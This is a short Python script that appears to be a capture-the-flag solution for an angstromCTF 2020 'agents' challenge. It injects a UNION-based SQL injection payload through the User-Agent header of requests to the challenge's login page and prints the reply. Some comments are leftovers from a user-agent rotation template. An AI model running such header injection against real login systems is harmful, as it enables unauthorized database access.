import urllib.request
import random
user_agent_list = [
   #Chrome
    #"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36' UNION ALL Select * from Agents ORDER BY UA DES1  LIMIT 1 -- - ",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36' UNION ALL Select * from Agents ORDER BY 1 LIMIT 1 -- - ",
]

url = 'https://agents.2020.chall.actf.co/login?'
#Lets make 5 requests and see what user agents are used 
for i in range(1,2):
    #Pick a random user agent
    user_agent = random.choice(user_agent_list)
    print(user_agent)
    #Set the headers 
    headers = {'User-Agent': user_agent}
    #Make the request
    request = urllib.request.Request(url,headers={'User-Agent': user_agent})
    response = urllib.request.urlopen(request)
    html = response.read()
    
    print("Request #%d\nUser-Agent Sent:%s\nUser Agent Recevied by HTTPBin:"%(i,user_agent))
    print("")
    print(html)
    print("-------------------\n\n")